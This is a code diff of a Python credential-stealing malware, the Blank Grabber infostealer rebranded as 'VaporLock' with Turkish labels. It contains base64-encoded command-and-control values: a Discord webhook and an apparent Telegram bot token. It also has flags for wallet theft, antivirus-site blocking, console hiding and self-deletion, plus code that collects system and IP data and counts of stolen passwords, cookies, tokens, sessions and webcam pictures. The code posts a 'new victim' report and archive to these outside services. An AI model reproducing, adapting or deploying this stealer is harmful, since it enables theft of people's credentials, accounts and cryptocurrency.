@@ -1,3 +1,5 @@
+# pip install pyaesm urllib3
+
 import base64
 import os
 import subprocess
@@ -19,14 +21,14 @@ from urllib3 import PoolManager, HTTPResponse, disable_warnings as disable_warni
 disable_warnings_urllib3()
 
 class Settings:
-    C2 = (0, base64.b64decode('aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTUwNzc5OTcxNzYzMzg1NTY0OS9IZ2EwaGh4ekczbG1hLW14dDBhZnJ6c01WaS1JV3JFU0xGX1p0VzJjQ2xYa1lJMC1nZXo3VVRULTFQRUV5QWxqUEtpWg==').decode())
-    Mutex = base64.b64decode('eXkxWmlWOVY4SWRKSHdZbQ==').decode()
-    PingMe = bool('true')
-    Vmprotect = bool('')
+    C2 = (1, base64.b64decode('ODg3MTk2NjgwNTpBQUVTTElDTEJzbjMzNGpsU2lHTWwtRnRnbXZidTNyNkFQTSQtNTE5NDI3MTA2NQ==').decode())
+    Mutex = base64.b64decode('U3M4TmJCeW8wWEduRTRGMg==').decode()
+    PingMe = bool('')
+    Vmprotect = bool('true')
     Startup = bool('')
-    Melt = bool('')
+    Melt = bool('true')
     UacBypass = bool('')
-    ArchivePassword = base64.b64decode('Y3JveGx2').decode()
+    ArchivePassword = base64.b64decode('Y3I=').decode()
     HideConsole = bool('true')
     Debug = bool('')
     RunBoundOnStartup = bool('')
@@ -45,14 +47,14 @@ class Settings:
     CaptureWallets = bool('true')
     FakeError = (bool(''), ('', '', '0'))
     BlockAvSites = bool('true')
-    DiscordInjection = bool('true')
+    DiscordInjection = bool('')
 if not hasattr(sys, '_MEIPASS'):
     sys._MEIPASS = os.path.dirname(os.path.abspath(__file__))
 ctypes.windll.kernel32.SetConsoleMode(ctypes.windll.kernel32.GetStdHandle(-11), 7)
 logging.basicConfig(format='\x1b[1;36m%(funcName)s\x1b[0m:\x1b[1;33m%(levelname)7s\x1b[0m:%(message)s')
 for _, logger in logging.root.manager.loggerDict.items():
     logger.disabled = True
-Logger = logging.getLogger('VaporLock')
+Logger = logging.getLogger('Blank Grabber')
 Logger.setLevel(logging.INFO)
 if not Settings.Debug:
     Logger.disabled = True
@@ -1317,20 +1319,20 @@ class BlankGrabber:
             r: dict = json.loads(http.request('GET', 'http://ip-api.com/json/?fields=225545').data.decode(errors='ignore'))
             if r.get('status') != 'success':
                 raise Exception('Failed')
-            data = f"\nIP: {r['query']}\nRegion: {r['regionName']}\nCountry: {r['country']}\nTimezone: {r['timezone']}\n\n{'Cellular Network:'.ljust(20)} {(chr(9989) if r['mobile'] else chr(10062))}\n{'Proxy/VPN:'.ljust(20)} {(chr(9989) if r['proxy'] else chr(10062))}"
+            data = f"\nIP: {r['query']}\nBölge: {r['regionName']}\nÜlke: {r['country']}\nZaman Dilimi: {r['timezone']}\n\n{'Hücresel Veri:'.ljust(20)} {(chr(9989) if r['mobile'] else chr(10062))}\n{'Proxy/VPN:'.ljust(20)} {(chr(9989) if r['proxy'] else chr(10062))}"
             if len(r['reverse']) != 0:
                 data += f"\nReverse DNS: {r['reverse']}"
         except Exception:
             ipinfo = '(Unable to get IP info)'
         else:
             ipinfo = data
-        system_info = f'Bilgisayar Adı: {computerName}\nİşletim Sistemi: {computerOS}\nToplam Ram: {totalMemory}\nUUID: {uuid}\nCPU: {cpu}\nGPU: {gpu}\nÜrün Anahtarı: {productKey}'
-        collection = {'Discord Hesapları': self.DiscordTokensCount, 'Şifreler': self.PasswordsCount, 'Kurabiyeler': len(self.Cookies), 'Geçmiş': self.HistoryCount, 'Otomatik Doldurmalar': self.AutofillCount, 'Roblox Kurabiyeleri': self.RobloxCookiesCount, 'Telegram Oturumları': self.TelegramSessionsCount, 'Sıradan Dosyalar': self.CommonFilesCount, 'Wallets': self.WalletsCount, 'Wifi Şifreleri': self.WifiPasswordsCount, 'Webcam': self.WebcamPicturesCount, 'Minecraft Oturumları': self.MinecraftSessions, 'Epic Oturumları': 'Yes' if self.EpicStolen else 'No', 'Steam Oturumları': 'Yes' if self.SteamStolen else 'No', 'Uplay Oturumları': 'Yes' if self.UplayStolen else 'No', 'Growtopia Oturumları': 'Yes' if self.GrowtopiaStolen else 'No', 'Ekran Görüntüsü': 'Yes' if self.ScreenshotTaken else 'No', 'Sistem Bilgisi': 'Yes' if self.SystemInfoStolen else 'No'}
+        system_info = f'Bilgisayar Adı: {computerName}\nİşetim Sistemi: {computerOS}\nToplam Ram: {totalMemory}\nUUID: {uuid}\nCPU: {cpu}\nGPU: {gpu}\nÜrün Anahtarı: {productKey}'
+        collection = {'Discord Accounts': self.DiscordTokensCount, 'Şifreler': self.PasswordsCount, 'Kurabiyeler': len(self.Cookies), 'Geçmiş': self.HistoryCount, 'Otomatik Doldurmalar': self.AutofillCount, 'Roblox Kurabiyeleri': self.RobloxCookiesCount, 'Telegram Oturumları': self.TelegramSessionsCount, 'Sıradan Klasörler': self.CommonFilesCount, 'Cüzdanlar': self.WalletsCount, 'Wifi Şifreleri': self.WifiPasswordsCount, 'Kamera': self.WebcamPicturesCount, 'Minecraft Oturumları': self.MinecraftSessions, 'Epic Oturumları': 'Yes' if self.EpicStolen else 'No', 'Steam Oturumları': 'Yes' if self.SteamStolen else 'No', 'Uplay Oturumları': 'Yes' if self.UplayStolen else 'No', 'Growtopia Oturumları': 'Yes' if self.GrowtopiaStolen else 'No', 'Ekran Görüntüsü': 'Yes' if self.ScreenshotTaken else 'No', 'Sistem Bilgisi': 'Yes' if self.SystemInfoStolen else 'No'}
         grabbedInfo = '\n'.join([key + ' : ' + str(value) for key, value in collection.items()])
         match Settings.C2[0]:
             case 0:
                 image_url = 'https://raw.githubusercontent.com/WEJUEKNII/parrse/refs/heads/main/vaporlock.png'
-                payload = {'content': '||@everyone||' if Settings.PingMe else '', 'embeds': [{'title': 'VaporLock', 'description': f'**__Sistem Bilgileri__\n```autohotkey\n{system_info}```\n__IP Info__```prolog\n{ipinfo}```\n__Toplanan Bilgi__```js\n{grabbedInfo}```**', 'url': 'https://github.com/Blank-c/Blank-Grabber', 'color': 34303, 'footer': {'text': 'Yapımcı:Croxlv | Tüm bilgiler VaporLock tarafından çekilmiştir.'}, 'thumbnail': {'url': image_url}}], 'username': 'VaporLock', 'avatar_url': image_url}
+                payload = {'content': '||@everyone||' if Settings.PingMe else '', 'embeds': [{'title': 'VaporLock', 'description': f'**__Sistem Bilgisi__\n```autohotkey\n{system_info}```\n__IP Bilgisi__```prolog\n{ipinfo}```\n__Alınan Bilgiler__```js\n{grabbedInfo}```**', 'url': 'https://github.com/Blank-c/Blank-Grabber', 'color': 34303, 'footer': {'text': 'Yapımcı: Croxlv | Tüm bilgiler VaporLock tarafından toplanmıştır'}, 'thumbnail': {'url': image_url}}], 'username': 'Blank Grabber', 'avatar_url': image_url}
                 if os.path.getsize(self.ArchivePath) / (1024 * 1024) > 20:
                     url = self.UploadToExternalService(self.ArchivePath, filename)
                     if url is None:
@@ -1345,7 +1347,7 @@ class BlankGrabber:
                 fields['payload_json'] = json.dumps(payload).encode()
                 http.request('POST', Settings.C2[1], fields=fields)
             case 1:
-                payload = {'caption': f'<b>VaporLock</b> got a new victim: <b>{os.getlogin()}</b>\n\n<b>IP Info</b>\n<code>{ipinfo}</code>\n\n<b>System Info</b>\n<code>{system_info}</code>\n\n<b>Toplanan Bilgi</b>\n<code>{grabbedInfo}</code>'.strip(), 'parse_mode': 'HTML'}
+                payload = {'caption': f'<b>Blank Grabber</b> got a new victim: <b>{os.getlogin()}</b>\n\n<b>IP Info</b>\n<code>{ipinfo}</code>\n\n<b>System Info</b>\n<code>{system_info}</code>\n\n<b>Grabbed Info</b>\n<code>{grabbedInfo}</code>'.strip(), 'parse_mode': 'HTML'}
                 if os.path.getsize(self.ArchivePath) / (1024 * 1024) > 40:
                     url = self.UploadToExternalService(self.ArchivePath, filename)
                     if url is None:
